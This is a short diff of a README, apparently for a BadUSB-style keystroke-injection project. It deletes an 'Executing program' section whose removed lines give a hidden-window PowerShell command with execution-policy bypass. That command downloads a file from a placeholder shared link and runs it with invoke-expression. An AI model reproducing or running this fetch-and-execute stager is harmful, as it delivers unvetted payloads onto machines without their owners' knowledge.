@@ -105,12 +105,6 @@ For this example notice the label in the image below and the code above are both
 
 ### Executing program
 
-* Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
-```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-```
-
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ## Contributing
